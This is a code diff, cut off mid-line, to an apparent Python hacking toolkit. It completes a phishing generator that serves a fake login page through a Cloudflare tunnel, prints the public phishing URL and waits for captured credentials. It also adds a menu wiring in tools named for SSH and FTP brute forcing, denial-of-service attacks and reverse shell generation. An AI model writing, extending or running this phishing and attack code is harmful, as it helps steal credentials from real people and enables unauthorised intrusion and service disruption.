@@ -406,7 +406,6 @@ def phishing_generator():
     template = templates.get(choice)
     if not template: print(f"{R}[!] Invalid choice.{W}"); return
 
-    # Simple HTTP server to handle requests
     class PhishingServer(threading.Thread):
         def __init__(self, port, directory):
             super().__init__()
@@ -414,7 +413,6 @@ def phishing_generator():
             self.directory = directory
             self.daemon = True
         def run(self):
-            # This is a trick to run the server in the correct directory
             os.chdir(self.directory)
             subprocess.Popen([sys.executable, '-m', 'http.server', str(self.port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             print(f"{B}[*] Local server started on port {self.port}.{W}")
@@ -431,4 +429,29 @@ def phishing_generator():
     print(f"{Y}    Waiting for credentials...{W}")
     try:
         for line in iter(cloudflare_proc.stdout.readline, ''):
-            if '.trycloudflare.com' in
+            if '.trycloudflare.com' in line:
+                url = "https://" + line.split("https://")[1].strip()
+                print(f"\n{G}[+] Phishing URL: {C}{url}{W}")
+    except KeyboardInterrupt:
+        print(f"\n{G}[+] Attack stopped. Shutting down servers...{W}")
+    finally:
+        os.system(f"killall -9 python cloudflared")
+        os.chdir(original_dir)
+        print(f"{G}[+] Servers shut down.{W}")
+
+# --- Main Program Logic ---
+def main():
+    tool_functions = {
+        '1': port_scanner, '2': vuln_scanner, '3': info_gathering, '4': subdomain_finder,
+        '5': admin_panel_finder, '6': link_extractor, '7': web_tech_scanner, '8': image_metadata_extractor,
+        '9': sql_injection_scanner, '10': xss_scanner, '11': command_injection_scanner, '12': security_headers_scanner,
+        '13': brute_force_ssh, '14': ftp_brute_force, '15': dos_attack, '16': reverse_shell_generator,
+        '17': custom_wordlist_generator, '18': encoder_decoder,
+        '21': phishing_generator
+    }
+    banner()
+    while True:
+        menu()
+        try:
+            choice = input(f"\n{Y}>> Enter your choice: {W}")
+            selected_tool = tool_functions
